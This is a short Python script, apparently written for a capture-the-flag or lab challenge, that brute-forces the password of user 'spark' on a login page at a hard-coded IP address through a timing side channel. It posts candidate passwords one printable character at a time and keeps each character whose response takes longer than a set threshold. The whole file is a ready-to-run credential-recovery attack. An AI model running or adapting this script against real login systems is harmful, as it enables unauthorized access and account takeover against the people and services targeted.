import requests
from string import printable
from time import sleep

site = "http://161.35.212.46:6002/login"
username = "spark"
password = ''
session = requests.Session()

def get_password():
    password = ''
    while True:
        for char in printable:
            test_pass = password + char
            payload = {
                'username': username,
                'password': test_pass
            }
            response = session.post(site, data=payload)
            time = response.elapsed.total_seconds()
            
            # If response time indicates more correct characters
            if time > (0.2) * len(test_pass):
                password += char
                print(f"Current progress: {password}")
                break
        else:
            print(f"Final password: {password}")
            return password
        


print(get_password())
